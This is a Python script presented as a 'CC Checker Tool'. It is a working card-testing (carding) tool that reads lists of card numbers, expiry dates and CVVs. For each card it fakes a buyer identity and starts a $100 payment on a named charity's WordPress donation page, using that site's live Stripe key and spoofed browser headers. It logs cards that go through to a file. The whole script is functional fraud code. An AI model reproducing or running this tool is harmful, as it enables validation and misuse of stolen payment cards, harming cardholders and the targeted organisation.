#!/usr/bin/python
import requests,json,sys,uuid,urllib3
urllib3.disable_warnings()
def funct(cc,mm,yy,cvv):
 print('[======> '+cc+' <======]')
 print('[+] Step 1 : Started ....')
 head1={
 'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
 'Pragma':'no-cache',
 'Accept':'*/*',
 }
 response1 = requests.get('https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US',headers=head1).json()
 for x in response1['results']:
  print('[*] Grab Random Info')
  name=x['name']['first']
  second=x['name']['last']
 email=(name+second+'@outlook.com').lower()
 fullname=name+' '+second
 print('[-] first Name : '+name)
 print('[-] last Name : '+second)
 print('[-] Full Name : '+fullname)
 print('[-] email : '+email)
 print('[*] Successfully Grabbed :)')
 print('[+] Step 2 : Started ....')
 cookies2 = {'content-type':'application/x-www-form-urlencoded',}
 Guid=str(requests.post('https://m.stripe.com/4',headers=head1,cookies=cookies2).text)
 Muid=str(uuid.uuid1())
 Sid=str(uuid.uuid1())
 print('[-] Guid : '+Guid)
 print('[-] Muid : '+Muid)
 print('[-] Sid : '+Sid)
 print('[*] Successfully generated :)')
 print('[+] Step 3 : Started ....')
 cookies3 = {
 'content-type':'application/x-www-form-urlencoded',
 'user-agent':'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
 }
 data3={
 'action': 'asp_pp_req_token',
 'amount': '100',
 'curr': 'USD',
 'product_id': '330',
 'quantity': '1',
 'billing_details': {'name':str(fullname),'email':str(email)},
 } 
 response3 = requests.post('https://elevatedbygrace.org/wp-admin/admin-ajax.php',data=data3,cookies=cookies3)
 amir=response3.json()
 client=str(amir['clientSecret'])
 pid=str(amir['pi_id'])
 print('[-] clientSecret : '+client)
 print('[-] pi_id : '+pid)
 print('[*] Successfully Grabbed :)')
 print('[+] Step 4 : Started ....')
 data4={
 'save_payment_method':'true',
 'setup_future_usage':'off_session',
 'payment_method_data[type]':'card',
 'payment_method_data[billing_details][name]':fullname,
 'payment_method_data[billing_details][email]':email,
 'payment_method_data[card][number]':str(cc),
 'payment_method_data[card][cvc]':str(cvv),
 'payment_method_data[card][exp_month]':str(mm),
 'payment_method_data[card][exp_year]':str(yy),
 'payment_method_data[guid]':Guid,
  'payment_method_data[muid]':Muid,
 'payment_method_data[sid]':Sid,
 'payment_method_data[pasted_fields]':'number',
 'payment_method_data[payment_user_agent]':'stripe.js%2F3c236fed%3B+stripe-js-v3%2F3c236fed',
 'payment_method_data[time_on_page]':'40371',
 'payment_method_data[referrer]':'https%3A%2F%2Felevatedbygrace.org%2F%3Fasp_action%3Dshow_pp%26product_id%3D330',
 'expected_payment_method_type':'card',
 'use_stripe_sdk':'true',
 'key':'pk_live_Alme0DgBmyGhR4EGURpxR0Xy',
 'client_secret':client,
 }
 cookies4 = {
 'content-type':'application/x-www-form-urlencoded',
 }
 head4={
 'accept': 'application/json',
 'accept-encoding': 'gzip, deflate, br',
 'accept-language': 'en-US,en;q=0.9',
 'content-length': '1012',
 'content-type': 'application/x-www-form-urlencoded',
 'origin': 'https://js.stripe.com',
 'referer': 'https://js.stripe.com/v3/controller-52375fd2df5c19565f60d66a345a1bff.html',
 'sec-fetch-dest': 'empty',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'same-site',
 'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
 }
 response4 = requests.post('https://api.stripe.com/v1/payment_intents/'+pid+'/confirm',data=data4,headers=head4,cookies=cookies4).json()
 if response4['error']['message'] in ['Your card was declined.','Your card has expired.']:
  print('[-] Result = '+response4['error']['message'])
  print('[-] Reason = '+response4['error']['decline_code'])
 else:
  print('[+] '+str(cc)+' Valid')
  open('Valid.txt','a+').write(str(cc)+'|'+mm+'|'+yy+'|'+cvv+'\n')
print('New CC Checker Tool Coded By ARON-TN')
print('Format : CC|mm|yy|cvv exmp : 346596528271562|09|2025|4233')
CCList=open(input('CCs List : '),'r').read().splitlines()
for i in CCList:
 cc=i.split('|')[0]
 mm=i.split('|')[1]
 yy=i.split('|')[2]
 cvv=i.split('|')[3]
 funct(cc,mm,yy,cvv)
